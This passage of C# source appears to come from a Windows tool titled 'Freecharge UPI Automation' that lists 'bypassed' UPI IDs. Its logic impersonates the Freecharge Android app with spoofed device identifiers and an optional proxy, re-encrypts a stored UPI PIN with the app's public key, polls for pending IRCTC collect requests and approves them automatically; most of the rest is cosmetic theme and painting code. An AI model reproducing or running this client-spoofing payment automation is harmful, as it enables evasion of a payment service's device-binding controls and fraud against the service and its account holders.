            Cookie cookie5 = new Cookie("upi_f_re", "1")
            {
                Domain = ".freechargebiz.in",
                Secure = Convert.ToBoolean("true")
            };
            cookieContainer_3.Add(cookie5);
        }
        catch
        {
        }
        num = 15000;
        if (string_96.Contains("accRefNumber"))
        {
            bankName = jsonData_Serial(string_96, "bankName");
            maskedAccnumber = jsonData_Serial(string_96, "maskedAccnumber");
            this.text6 = "{\"device\":{\"app\":\"com.freecharge.upi\",\"capability\":\"" + mobnumber + "\",\"id\":\"" + oemdeviceid + "\",\"ip\":\"192.168.0.66\",\"mobile\":\"" + customerid + "\",\"os\":\"android\",\"type\":\"MOB\"},\"deviceIdList\":[\"70a25356a53746b3be24334a684c1188\"],\"deviceIdMigrationFlowVersion\":3}";
            this.text6 = this.text6.Replace("70a25356a53746b3be24334a684c1188", oemdeviceid);
            string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/upistatus?fcAppType=android&fcChannel=3&fcversion=578";
            if (_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
            {
            }
            if (string_96.Contains("REGISTERED"))
            {
                upiid = jsonData_Serial(string_96, "vpa");
                bankcode = jsonData_Serial(string_96, "bankCode");
                bankName = jsonData_Serial(string_96, "bankName");
                accRefNumber = jsonData_Serial(string_96, "accRefNumber");
                typea = jsonData_Serial(string_96, "type");
                maskedAccnumber = jsonData_Serial(string_96, "maskedAccnumber");
                atmpinlengh = jsonData_Serial(string_96, "atmpinlength");
                dlength = jsonData_Serial(string_96, "dlength");
                dLength = jsonData_Serial(string_96, "dLength");
                ifsc = jsonData_Serial(string_96, "ifsc");
                otpLength = jsonData_Serial(string_96, "otpLength");
                names = jsonData_Serial(string_96, "name");
                _ = string_96 + "|||" + app_fc + "|||" + oemdeviceid + "|||" + mobnumber + "|||" + miib + "|||" + ki + "|||" + csrfRequestIdentifier + "||||||" + fc_v;
            }
            do
            {
                string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/common/v1/customer/pending/send?fcAppType=android&fcChannel=3&fcversion=578";
                if (!_Request_Sbi1(string_93, null, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                {
                }
                jsonData_Serial(string_96, "count");
            }
            while (!string_96.Contains("IRCTC"));
            string text3 = jsonData_Serial(string_96, "showReminderUntil");
            string text4 = jsonData_Serial(string_96, "payeeMcc");
            string text5 = jsonData_Serial(string_96, "beneName");
            string text6 = jsonData_Serial(string_96, "payeeVpa");
            string text7 = jsonData_Serial(string_96, "rrn");
            string text8 = jsonData_Serial(string_96, "remarks");
            string text9 = jsonData_Serial(string_96, "txnid");
            string text10 = "AXIFRC" + RandomString(29, "0123456789abcdef");
            string input = "|" + text10 + "|||" + packageName + "|91" + mobnumber + "|" + oemdeviceid;
            string text11 = sha256_hashing(input, key);
            string text12 = upipinn;
            string input2 = text12 + "|" + text10 + "|" + text11;
            string base64PublicKey = miib;
            string newValue = RSA_ENCRYPT_PKEY(input2, base64PublicKey);
            this.text6 = "{\"ac\":{\"accRefNumber\":\"" + accRefNumber + "\",\"address\":null,\"aeba\":\"Y\",\"atmpinFormat\":\"FORMAT3|FORMAT1\",\"atmpinlength\":\"" + atmpinlengh + "\",\"balTime\":\"\",\"balance\":\"\",\"bankId\":null,\"bankName\":\"" + bankName + "\",\"dLength\":\"" + dLength + "\",\"dType\":\"NUM\",\"dlength\":\"" + dlength + "\",\"dtype\":\"NUM\",\"ifsc\":\"" + ifsc + "\",\"iin\":\"" + bankcode + "\",\"logo\":\"" + logo + "\",\"maskedAccnumber\":\"" + maskedAccnumber + "\",\"mbeba\":\"Y\",\"mmid\":null,\"name\":\"" + names + "\",\"otpFormat\":\"NUM\",\"otpLength\":\"" + otpLength + "\",\"partyId\":null,\"status\":\"A\",\"type\":\"" + typea + "\",\"uidnum\":null,\"vpa\":\"" + upiid + "\"},\"amount\":\"101.80\",\"cred\":{\"data\":{\"code\":\"NPCI\",\"encryptedBase64String\":\"2.1|LlmxuDd6p+oDbD3ykwedVgwsakVBUnh5Wu1wl1ALmF+LnzIEpUIhnYDV8OVXYMRBuRKuOr5gCLDCajEf5PFBE08KXxzY3XeR96dobuFzcxDcf10iMS6IEEBQsRSpga2hC5YFQMC+Gvlge3jeJy5UrIC5lUXBIRqjzGsYZxgUudh3WaBAR3YsFfwa51OquoSICvlxActiWAMitaShQo02mP7TK7aWSiYHBXqRTOescE8V098mh6YfnfZK02o7JBIgIHKyR6PHFbcHmxH9HytM7bghS9IvzfXbmJHpWKVsfJTuLaoRvQQObXNnd5g4NBXoHYDDLfUrBlZSvmybGA==\",\"ki\":\"" + ki + "\"},\"subType\":\"MPIN\",\"type\":\"PIN\"},\"customerid\":\"" + customerid + "\",\"device\":{\"app\":\"com.freecharge.upi\",\"capability\":\"" + mobnumber + "\",\"id\":\"" + oemdeviceid + "\",\"ip\":\"192.168.0.66\",\"mobile\":\"" + customerid + "\",\"os\":\"android\",\"type\":\"MOB\"},\"expiry\":\"" + text3 + "\",\"payeeMcc\":\"" + text4 + "\",\"payeeName\":\"" + text5 + "\",\"payeeVpa\":\"" + text6 + "\",\"refid\":\"" + text7 + "\",\"remarks\":\"" + text8 + "\",\"saveAsBeneficiary\":false,\"txnid\":\"" + text9 + "\"}";
            this.text6 = this.text6.Replace("LlmxuDd6p+oDbD3ykwedVgwsakVBUnh5Wu1wl1ALmF+LnzIEpUIhnYDV8OVXYMRBuRKuOr5gCLDCajEf5PFBE08KXxzY3XeR96dobuFzcxDcf10iMS6IEEBQsRSpga2hC5YFQMC+Gvlge3jeJy5UrIC5lUXBIRqjzGsYZxgUudh3WaBAR3YsFfwa51OquoSICvlxActiWAMitaShQo02mP7TK7aWSiYHBXqRTOescE8V098mh6YfnfZK02o7JBIgIHKyR6PHFbcHmxH9HytM7bghS9IvzfXbmJHpWKVsfJTuLaoRvQQObXNnd5g4NBXoHYDDLfUrBlZSvmybGA==", newValue);
            string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/collect/approve?fcAppType=android&fcChannel=3&fcversion=578";
            if (_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
            {
            }
            return string_96;
        }
        return string_96;
    }

    private void button3_Click(object sender, EventArgs e)
    {
        string text = listBox1.SelectedItem.ToString();
        string text2 = ".\\Freecharge\\" + text + ".rg";
        string currentDirectory = Directory.GetCurrentDirectory();
        Path_ = currentDirectory + text2;
        if (File.Exists(Path_))
        {
            File.Delete(Path_);
        }
        try
        {
            string text3 = "IPAYUPI_" + text;
            text3 = text3.Replace(".rg", "");
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            sQLiteCommand.CommandText = "DELETE from TBL_BANK where BANK_SAVEAS = '" + text3 + "' AND BANK_ISDEBIT = 0";
            sQLiteCommand.ExecuteNonQuery();
            sQLiteConnection.Close();
            sQLiteCommand.Dispose();
        }
        catch
        {
        }
        MessageBox.Show("Bypass Delete Sucessfull...");
        Close();
    }

    private void darkDropdownList1_Click(object sender, EventArgs e)
    {
    }

    private void Freecharge_Load(object sender, EventArgs e)
    {
    }

    private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
        Process.Start("https://drive.google.com/file/d/1uXik8xemL3XxotL5nZzrB5GXH_c5VnEs/view?usp=sharing");
    }

    private void btnClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void bunifuImageButton1_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void pnlHeader_Paint(object sender, PaintEventArgs e)
    {
    }

    private void label1_Click(object sender, EventArgs e)
    {
    }

    private void txtSms_TextChanged(object sender, EventArgs e)
    {
    }

    private void checkBox1_CheckedChanged(object sender, EventArgs e)
    {
        if (checkBox1.Checked)
        {
            ip = true;
            ipfor = Interaction.InputBox("Enter IP in IP:PORT:USERNAME:PASSWORD.", "Enter IP");
            ipfor = ipfor.Trim();
        }
        else
        {
            ip = false;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }


    // ===== Express theme (light + bhagwa) - visual layer only. Freecharge logic/events are untouched. =====
    private static readonly Color FX_BG = Color.FromArgb(236, 242, 251);
    private static readonly Color FX_ORANGE = Color.FromArgb(245, 146, 28);
    private static readonly Color FX_HEAD_L = Color.FromArgb(214, 96, 4);
    private static readonly Color FX_HEAD_R = Color.FromArgb(248, 158, 44);
    private static readonly Color FX_NAVY = Color.FromArgb(15, 42, 92);
    private static readonly Color FX_BLUE = Color.FromArgb(37, 99, 235);
    private static readonly Color FX_TEXT = Color.FromArgb(30, 41, 59);
    private static readonly Color FX_MUTED = Color.FromArgb(100, 116, 139);
    private static readonly Color FX_LINE = Color.FromArgb(220, 228, 241);
    private static readonly Color FX_FIELD = Color.FromArgb(203, 213, 225);
    private static readonly Color FX_FRAME = Color.FromArgb(178, 196, 226);
    private static readonly Color FX_RED = Color.FromArgb(220, 38, 38);

    private const int FX_W = 720, FX_HEAD = 42, FX_M = 14;
    private static readonly Rectangle FX_LEFT = new Rectangle(14, 56, 340, 220);
    private static readonly Rectangle FX_RIGHT = new Rectangle(366, 56, 340, 220);
    private static readonly Rectangle FX_MOBILE_BOX = new Rectangle(28, 166, 312, 38);
    private static readonly Rectangle FX_LIST_BOX = new Rectangle(380, 92, 312, 118);
    private Rectangle fxSmsCard = Rectangle.Empty, fxSmsBox = Rectangle.Empty, fxQrBox = Rectangle.Empty, fxErr = Rectangle.Empty;

    private readonly Font fxFTitle = new Font("Segoe UI Semibold", 11F);
    private readonly Font fxFCard = new Font("Segoe UI", 8.25F, FontStyle.Bold);
    private readonly Font fxFCaption = new Font("Segoe UI Semibold", 8.75F);
    private readonly Font fxFBody = new Font("Segoe UI", 9F);
    private readonly Font fxFField = new Font("Segoe UI", 11F);
    private readonly Font fxFBtn = new Font("Segoe UI Semibold", 9.75F);
    private readonly Font fxFSmall = new Font("Segoe UI", 8F);

    private readonly Dictionary<Control, int> fxState = new Dictionary<Control, int>();
    private Label fxCue;
    private int fxHotItem = -1;
    private bool fxCloseHot, fxCloseDown, fxLayingOut;

    private void ApplyByteNovaLatestTheme()
    {
        SuspendLayout();

        BackColor = FX_BG;
        ForeColor = FX_TEXT;
        FormBorderStyle = FormBorderStyle.None;
        DoubleBuffered = true;
        ClientSize = new Size(FX_W, 290);

        // ---- header ribbon ----
        if (pnlHeader != null)
        {
            pnlHeader.Dock = DockStyle.Top;
            pnlHeader.Height = FX_HEAD;
            pnlHeader.BackColor = FX_HEAD_L;
            pnlHeader.Padding = new Padding(48, 0, 48, 3);
            FxBuffer(pnlHeader);
            pnlHeader.Paint -= ByteNovaFreechargeHeaderPaint;
            pnlHeader.Paint += ByteNovaFreechargeHeaderPaint;
            pnlHeader.Resize -= FxPlaceClose;
            pnlHeader.Resize += FxPlaceClose;
            pnlHeader.BringToFront();
        }
        if (label5 != null)
        {
            label5.Dock = DockStyle.Fill;
            label5.AutoSize = false;
            label5.Text = "Freecharge UPI Automation";
            label5.TextAlign = ContentAlignment.MiddleLeft;
            label5.ForeColor = Color.White;
            label5.BackColor = Color.Transparent;
            label5.Font = fxFTitle;
            label5.Padding = new Padding(0);
            label5.UseCompatibleTextRendering = false;
            label5.BringToFront();
        }

        // bunifuImageButton1 is the header Close button of this form.
        if (bunifuImageButton1 != null)
        {
            if (bunifuImageButton1.Parent != pnlHeader) bunifuImageButton1.Parent = pnlHeader;
            bunifuImageButton1.Anchor = AnchorStyles.Top | AnchorStyles.Left;
            bunifuImageButton1.Visible = true;
            bunifuImageButton1.Zoom = 0;
            bunifuImageButton1.Size = new Size(32, 26);
            bunifuImageButton1.BackColor = Color.Transparent;
            bunifuImageButton1.BackgroundImage = null;
            bunifuImageButton1.Cursor = Cursors.Hand;
            bunifuImageButton1.Paint -= ByteNovaFreechargeClosePaint;
            bunifuImageButton1.Paint += ByteNovaFreechargeClosePaint;
            bunifuImageButton1.MouseEnter += delegate { fxCloseHot = true; bunifuImageButton1.Invalidate(); };
            bunifuImageButton1.MouseLeave += delegate { fxCloseHot = false; fxCloseDown = false; bunifuImageButton1.Invalidate(); };
            bunifuImageButton1.MouseDown += delegate { fxCloseDown = true; bunifuImageButton1.Invalidate(); };
            bunifuImageButton1.MouseUp += delegate { fxCloseDown = false; if (!bunifuImageButton1.IsDisposed) bunifuImageButton1.Invalidate(); };
            FxPlaceClose(null, EventArgs.Empty);
        }
        // Second (form-level) close control stays hidden so only the header one shows.
        if (btnClose != null) btnClose.Visible = false;

        // ---- left card : registration ----
        if (checkBox1 != null)
        {
            checkBox1.AutoSize = false;
            checkBox1.SetBounds(FX_LEFT.X + 14, FX_LEFT.Y + 36, FX_LEFT.Width - 28, 40);
            checkBox1.BackColor = Color.White;
            checkBox1.ForeColor = FX_TEXT;
            checkBox1.Font = fxFCaption;
            checkBox1.Cursor = Cursors.Hand;
            checkBox1.UseVisualStyleBackColor = false;
            checkBox1.Paint -= FxTogglePaint;
            checkBox1.Paint += FxTogglePaint;
            FxHover(checkBox1);
        }
        if (label3 != null)
        {
            label3.AutoSize = false;
            label3.SetBounds(FX_MOBILE_BOX.X, FX_MOBILE_BOX.Y - 24, FX_MOBILE_BOX.Width, 20);
            label3.Text = "Enter Mobile Number";
            label3.Font = fxFCaption;
            label3.ForeColor = FX_MUTED;
            label3.BackColor = Color.White;
            label3.TextAlign = ContentAlignment.MiddleLeft;
        }
        if (mobilenumber != null)
        {
            mobilenumber.BorderStyle = BorderStyle.None;
            mobilenumber.BackColor = Color.White;
            mobilenumber.ForeColor = FX_TEXT;
            mobilenumber.Font = fxFField;
            int th = mobilenumber.PreferredHeight;
            mobilenumber.SetBounds(FX_MOBILE_BOX.X + 38, FX_MOBILE_BOX.Y + (FX_MOBILE_BOX.Height - th) / 2,
                FX_MOBILE_BOX.Width - 50, th);
            mobilenumber.GotFocus += delegate { Invalidate(Rectangle.Inflate(FX_MOBILE_BOX, 4, 4)); };
            mobilenumber.LostFocus += delegate { Invalidate(Rectangle.Inflate(FX_MOBILE_BOX, 4, 4)); };

            fxCue = new Label();
            fxCue.AutoSize = false;
            fxCue.BackColor = Color.White;
            fxCue.ForeColor = Color.FromArgb(148, 163, 184);
            fxCue.Font = fxFField;
            fxCue.Text = "10-digit number, without 91";
            fxCue.TextAlign = ContentAlignment.MiddleLeft;
            fxCue.Bounds = mobilenumber.Bounds;
            fxCue.Cursor = Cursors.IBeam;
            fxCue.Click += delegate { mobilenumber.Focus(); };
            Controls.Add(fxCue);
            fxCue.BringToFront();
            mobilenumber.TextChanged += delegate { FxSyncCue(); };
            mobilenumber.GotFocus += delegate { FxSyncCue(); };
            mobilenumber.LostFocus += delegate { FxSyncCue(); };
            FxSyncCue();
        }
        FxButton(button1, new Rectangle(FX_LEFT.X + 14, FX_LEFT.Bottom - 54, FX_LEFT.Width - 28, 40));

        // ---- right card : bypassed UPI ----
        if (label4 != null) label4.Visible = false;          // caption is painted on the card
        if (listBox1 != null)
        {
            listBox1.BorderStyle = BorderStyle.None;
            listBox1.BackColor = Color.White;
            listBox1.ForeColor = FX_TEXT;
            listBox1.Font = fxFBody;
            listBox1.DrawMode = DrawMode.OwnerDrawFixed;
            listBox1.ItemHeight = 28;
            listBox1.IntegralHeight = false;
            listBox1.SetBounds(FX_LIST_BOX.X + 2, FX_LIST_BOX.Y + 2, FX_LIST_BOX.Width - 4, FX_LIST_BOX.Height - 4);
            listBox1.DrawItem -= FxListDraw;
            listBox1.DrawItem += FxListDraw;
            listBox1.MouseMove += FxListMove;
            listBox1.MouseLeave += delegate { int o = fxHotItem; fxHotItem = -1; FxInvItem(o); };
            listBox1.SelectedIndexChanged += delegate { listBox1.Invalidate(); };
            listBox1.Cursor = Cursors.Hand;
        }
        FxButton(button2, new Rectangle(FX_RIGHT.X + 14, FX_RIGHT.Bottom - 54, 190, 40));
        FxButton(button3, new Rectangle(FX_RIGHT.X + 14 + 190 + 10, FX_RIGHT.Bottom - 54, FX_RIGHT.Width - 28 - 200, 40));

        // ---- SMS step (shown by the logic after Start) ----
        if (txtSms != null)
        {
            txtSms.BorderStyle = BorderStyle.None;
            txtSms.BackColor = Color.White;
            txtSms.ForeColor = FX_TEXT;
            txtSms.Font = fxFBody;
            txtSms.VisibleChanged += delegate { FxLayout(); };
        }
        FxButton(btnCopy, Rectangle.Empty);
        FxButton(btnNext, Rectangle.Empty);
        if (pictureBox1 != null)
        {
            pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            pictureBox1.BackColor = Color.White;
            pictureBox1.VisibleChanged += delegate { FxLayout(); };
        }
        if (label1 != null)
        {
            label1.AutoSize = false;
            label1.Font = fxFBody;
            label1.ForeColor = FX_TEXT;
            label1.BackColor = Color.White;
            label1.TextAlign = ContentAlignment.TopLeft;
            label1.UseCompatibleTextRendering = false;
        }
        if (label2 != null)
        {
            label2.AutoSize = false;
            label2.Font = fxFCaption;
            label2.ForeColor = Color.FromArgb(185, 28, 28);
            label2.BackColor = Color.FromArgb(254, 242, 242);
            label2.TextAlign = ContentAlignment.MiddleLeft;
            label2.AutoEllipsis = true;
            label2.VisibleChanged += delegate { FxLayout(); };
            label2.TextChanged += delegate { FxLayout(); };
        }
        if (pictureBox2 != null) pictureBox2.Visible = false;   // empty placeholder, never used by the logic

        Paint -= FxFormPaint;
        Paint += FxFormPaint;

        ResumeLayout(false);
        FxLayout();
        Invalidate(true);
    }

    // Lays out the optional SMS step and the error banner below the two cards and fits the form height.
    private void FxLayout()
    {
        if (fxLayingOut || IsDisposed) return;
        fxLayingOut = true;
        try
        {
            int y = FX_LEFT.Bottom + 12;
            bool sms = FxWants(txtSms) || FxWants(pictureBox1);
            if (sms)
            {
                fxSmsCard = new Rectangle(FX_M, y, FX_W - FX_M * 2, 236);
                int top = fxSmsCard.Y + 36;
                fxSmsBox = new Rectangle(fxSmsCard.X + 14, top, 300, 132);
                if (txtSms != null) txtSms.SetBounds(fxSmsBox.X + 8, fxSmsBox.Y + 6, fxSmsBox.Width - 12, fxSmsBox.Height - 12);
                if (btnCopy != null) btnCopy.SetBounds(fxSmsBox.X, fxSmsBox.Bottom + 12, 145, 40);
                if (btnNext != null) btnNext.SetBounds(fxSmsBox.Right - 145, fxSmsBox.Bottom + 12, 145, 40);
                fxQrBox = new Rectangle(fxSmsBox.Right + 16, top, 184, 184);
                if (pictureBox1 != null) pictureBox1.SetBounds(fxQrBox.X + 6, fxQrBox.Y + 6, fxQrBox.Width - 12, fxQrBox.Height - 12);
                if (label1 != null)
                    label1.SetBounds(fxQrBox.Right + 16, top, fxSmsCard.Right - 14 - (fxQrBox.Right + 16), 184);
                y = fxSmsCard.Bottom + 12;
            }
            else
            {
                fxSmsCard = fxSmsBox = fxQrBox = Rectangle.Empty;
            }

            bool err = FxWants(label2) && label2 != null && !string.IsNullOrEmpty(label2.Text);
            if (err)
            {
                fxErr = new Rectangle(FX_M, y, FX_W - FX_M * 2, 36);
                label2.SetBounds(fxErr.X + 36, fxErr.Y + 4, fxErr.Width - 46, fxErr.Height - 8);
                y = fxErr.Bottom + 12;
            }
            else
            {
                fxErr = Rectangle.Empty;
                if (label2 != null) label2.SetBounds(FX_M + 36, -200, 10, 10);   // parked while hidden
            }

            int h = Math.Max(y + 2, FX_LEFT.Bottom + 14);
            if (ClientSize.Height != h || ClientSize.Width != FX_W) ClientSize = new Size(FX_W, h);
            Invalidate();
        }
        finally { fxLayingOut = false; }
    }

    // A child's own Visible flag, readable before the form itself is shown.
    private static bool FxWants(Control c)
    {
        if (c == null) return false;
        try
        {
            System.Reflection.MethodInfo m = typeof(Control).GetMethod("GetState",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            if (m != null) return (bool)m.Invoke(c, new object[] { 2 });
        }
        catch { }
        return c.Visible;
    }

    private static void FxBuffer(Control c)
    {
        try
        {
            typeof(Control).GetProperty("DoubleBuffered",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)
                .SetValue(c, true, null);
        }
        catch { }
    }

    private void FxSyncCue()
    {
        if (fxCue == null || mobilenumber == null) return;
        fxCue.Bounds = mobilenumber.Bounds;
        fxCue.Visible = mobilenumber.Visible && mobilenumber.TextLength == 0 && !mobilenumber.Focused;
        if (fxCue.Visible) fxCue.BringToFront();
    }

    private void FxPlaceClose(object sender, EventArgs e)
    {
        if (bunifuImageButton1 == null || bunifuImageButton1.IsDisposed || pnlHeader == null) return;
        bunifuImageButton1.Location = new Point(Math.Max(0, pnlHeader.Width - bunifuImageButton1.Width - 10),
            Math.Max(0, (pnlHeader.Height - 3 - bunifuImageButton1.Height) / 2));
        bunifuImageButton1.BringToFront();
    }

    private void FxHover(Control c)
    {
        if (c == null || fxState.ContainsKey(c)) return;
        fxState[c] = 0;
        c.MouseEnter += delegate { fxState[c] = 1; c.Invalidate(); };
        c.MouseLeave += delegate { fxState[c] = 0; c.Invalidate(); };
        c.MouseDown += delegate (object s, MouseEventArgs e) { if (e.Button == MouseButtons.Left) { fxState[c] = 2; c.Invalidate(); } };
        c.MouseUp += delegate
        {
            if (c.IsDisposed) return;
            fxState[c] = c.ClientRectangle.Contains(c.PointToClient(MousePosition)) ? 1 : 0;
            c.Invalidate();
        };
        c.EnabledChanged += delegate { fxState[c] = 0; c.Invalidate(); };
    }

    private int FxSt(Control c)
    {
        int s;
        return c != null && fxState.TryGetValue(c, out s) ? s : 0;
    }

    private void FxButton(Button b, Rectangle bounds)
    {
        if (b == null) return;
        b.UseVisualStyleBackColor = false;
        b.FlatStyle = FlatStyle.Flat;
        b.FlatAppearance.BorderSize = 0;
        b.FlatAppearance.MouseOverBackColor = Color.White;
        b.FlatAppearance.MouseDownBackColor = Color.White;
        b.BackColor = Color.White;
        b.Font = fxFBtn;
        b.Cursor = Cursors.Hand;
        if (!bounds.IsEmpty) b.Bounds = bounds;
        FxHover(b);
        b.Paint -= FxButtonPaint;
        b.Paint += FxButtonPaint;
    }

    // ---------------- painting ----------------

    private static GraphicsPath FxRound(RectangleF r, float rad)
    {
        GraphicsPath p = new GraphicsPath();
        float d = Math.Min(rad * 2, Math.Min(r.Width, r.Height));
        if (d < 1) { p.AddRectangle(r); return p; }
        p.AddArc(r.X, r.Y, d, d, 180, 90);
        p.AddArc(r.Right - d, r.Y, d, d, 270, 90);
        p.AddArc(r.Right - d, r.Bottom - d, d, d, 0, 90);
        p.AddArc(r.X, r.Bottom - d, d, d, 90, 90);
        p.CloseFigure();
        return p;
    }

    private static void FxFill(Graphics g, RectangleF r, float rad, Color fill, Color border)
    {
        if (r.Width < 1 || r.Height < 1) return;
        using (GraphicsPath p = FxRound(r, rad))
        {
            using (SolidBrush b = new SolidBrush(fill)) g.FillPath(b, p);
            if (border.A > 0) using (Pen pen = new Pen(border, 1F)) g.DrawPath(pen, p);
        }
    }

    private static Color FxMix(Color a, Color b, float t)
    {
        return Color.FromArgb(a.A,
            (int)(a.R + (b.R - a.R) * t),
            (int)(a.G + (b.G - a.G) * t),
            (int)(a.B + (b.B - a.B) * t));
    }

    private void FxCard(Graphics g, Rectangle r, string title, string icon, string badge)
    {
        FxFill(g, new RectangleF(r.X, r.Y + 2, r.Width - 1, r.Height - 1), 12, Color.FromArgb(214, 225, 242), Color.Empty);
        FxFill(g, new RectangleF(r.X, r.Y, r.Width - 1, r.Height - 1), 12, Color.White, FX_LINE);
        FxFill(g, new RectangleF(r.X + 1, r.Y + 12, 3.5f, 18), 1.7f, FX_ORANGE, Color.Empty);
        FxIcon(g, icon, new Rectangle(r.X + 14, r.Y + 14, 14, 14), FX_ORANGE);
        TextRenderer.DrawText(g, title, fxFCard, new Point(r.X + 34, r.Y + 13), FX_NAVY, TextFormatFlags.NoPadding);
        if (!string.IsNullOrEmpty(badge))
        {
            Size ts = TextRenderer.MeasureText(g, title, fxFCard, Size.Empty, TextFormatFlags.NoPadding);
            Size bs = TextRenderer.MeasureText(g, badge, fxFSmall, Size.Empty, TextFormatFlags.NoPadding);
            Rectangle br = new Rectangle(r.X + 34 + ts.Width + 8, r.Y + 11, bs.Width + 14, 18);
            FxFill(g, br, 9, Color.FromArgb(255, 237, 213), Color.Empty);
            TextRenderer.DrawText(g, badge, fxFSmall, br, Color.FromArgb(194, 65, 12),
                TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.NoPadding);
        }
    }

    private void FxFormPaint(object sender, PaintEventArgs e)
    {
        Graphics g = e.Graphics;
        g.SmoothingMode = SmoothingMode.AntiAlias;
        g.Clear(FX_BG);

        // registration card
        FxCard(g, FX_LEFT, "REGISTRATION", "user", null);
        bool focus = mobilenumber != null && mobilenumber.Focused;
        if (focus)
            FxFill(g, RectangleF.Inflate(FX_MOBILE_BOX, 2, 2), 10, Color.FromArgb(46, FX_BLUE), Color.Empty);
        FxFill(g, new RectangleF(FX_MOBILE_BOX.X, FX_MOBILE_BOX.Y, FX_MOBILE_BOX.Width - 1, FX_MOBILE_BOX.Height - 1), 8,
            Color.White, focus ? FX_BLUE : FX_FIELD);
        FxIcon(g, "phone", new Rectangle(FX_MOBILE_BOX.X + 13, FX_MOBILE_BOX.Y + 11, 12, 16), focus ? FX_BLUE : FX_ORANGE);
        using (Pen sep = new Pen(Color.FromArgb(232, 237, 245)))
            g.DrawLine(sep, FX_MOBILE_BOX.X + 32, FX_MOBILE_BOX.Y + 8, FX_MOBILE_BOX.X + 32, FX_MOBILE_BOX.Bottom - 9);

        // bypassed UPI card
        int count = listBox1 != null ? listBox1.Items.Count : 0;
        FxCard(g, FX_RIGHT, "BYPASSED UPI", "upi", count + (count == 1 ? " ID" : " IDs"));
        FxFill(g, new RectangleF(FX_LIST_BOX.X, FX_LIST_BOX.Y, FX_LIST_BOX.Width - 1, FX_LIST_BOX.Height - 1), 8, Color.White, FX_FIELD);
        if (count == 0)
            TextRenderer.DrawText(g, "No bypassed UPI yet", fxFBody, FX_LIST_BOX, FX_MUTED,
                TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.NoPadding);

        // SMS verification step
        if (!fxSmsCard.IsEmpty)
        {
            FxCard(g, fxSmsCard, "SMS VERIFICATION", "sms", null);
            FxFill(g, new RectangleF(fxSmsBox.X, fxSmsBox.Y, fxSmsBox.Width - 1, fxSmsBox.Height - 1), 8, Color.White, FX_FIELD);
            FxFill(g, new RectangleF(fxQrBox.X, fxQrBox.Y, fxQrBox.Width - 1, fxQrBox.Height - 1), 8, Color.White, FX_FIELD);
        }

        // error banner (label2 shows the message)
        if (!fxErr.IsEmpty)
        {
            FxFill(g, new RectangleF(fxErr.X, fxErr.Y, fxErr.Width - 1, fxErr.Height - 1), 8,
                Color.FromArgb(254, 242, 242), Color.FromArgb(252, 165, 165));
            FxIcon(g, "warn", new Rectangle(fxErr.X + 12, fxErr.Y + 10, 16, 16), FX_RED);
        }

        using (Pen p = new Pen(FX_FRAME))
            g.DrawRectangle(p, 0, 0, ClientSize.Width - 1, ClientSize.Height - 1);
    }

    private void ByteNovaFreechargeHeaderPaint(object sender, PaintEventArgs e)
    {
        Control c = sender as Control;
        if (c == null || c.Width < 2 || c.Height < 2) return;
        Graphics g = e.Graphics;
        g.SmoothingMode = SmoothingMode.AntiAlias;
        Rectangle r = new Rectangle(0, 0, c.Width, c.Height);

        using (LinearGradientBrush bg = new LinearGradientBrush(r, FX_HEAD_L, FX_HEAD_R, LinearGradientMode.Horizontal))
            g.FillRectangle(bg, r);
        using (SolidBrush shine = new SolidBrush(Color.FromArgb(20, 255, 255, 255)))
            g.FillRectangle(shine, 0, 0, c.Width, (c.Height - 3) / 2);
        using (SolidBrush navy = new SolidBrush(FX_NAVY))
            g.FillRectangle(navy, 0, c.Height - 3, c.Width, 3);

        int h = c.Height - 3;
        Rectangle badge = new Rectangle(12, (h - 28) / 2, 28, 28);
        using (SolidBrush sh = new SolidBrush(Color.FromArgb(50, 0, 0, 0)))
            g.FillEllipse(sh, badge.X, badge.Y + 1, badge.Width, badge.Height);
        using (SolidBrush wb = new SolidBrush(Color.White))
            g.FillEllipse(wb, badge);
        FxIcon(g, "bolt", new Rectangle(badge.X + 8, badge.Y + 5, 12, 18), FX_ORANGE);
    }

    private void ByteNovaFreechargeClosePaint(object sender, PaintEventArgs e)
    {
        Control c = sender as Control;
        if (c == null) return;
        Graphics g = e.Graphics;
        g.SmoothingMode = SmoothingMode.AntiAlias;

        // repaint the ribbon underneath so the original image never shows through
        Control p = c.Parent;
        int pw = p != null ? Math.Max(1, p.Width) : c.Width;
        int ph = p != null ? Math.Max(1, p.Height) : c.Height;
        using (LinearGradientBrush bg = new LinearGradientBrush(new Rectangle(-c.Left, -c.Top, pw, ph), FX_HEAD_L, FX_HEAD_R, LinearGradientMode.Horizontal))
            g.FillRectangle(bg, 0, 0, c.Width, c.Height);

        // red by default, white + red X on hover, dark red when pressed
        RectangleF r = new RectangleF(0.5f, fxCloseDown ? 1.5f : 0.5f, c.Width - 2, c.Height - 2);
        Color fill = fxCloseDown ? Color.FromArgb(153, 27, 27) : fxCloseHot ? Color.White : FX_RED;
        Color line = fxCloseDown ? Color.FromArgb(127, 29, 29) : fxCloseHot ? FX_RED : Color.FromArgb(185, 28, 28);
        Color xc = fxCloseHot && !fxCloseDown ? FX_RED : Color.White;
        FxFill(g, r, 7, fill, line);
        float cx = r.X + r.Width / 2f, cy = r.Y + r.Height / 2f;
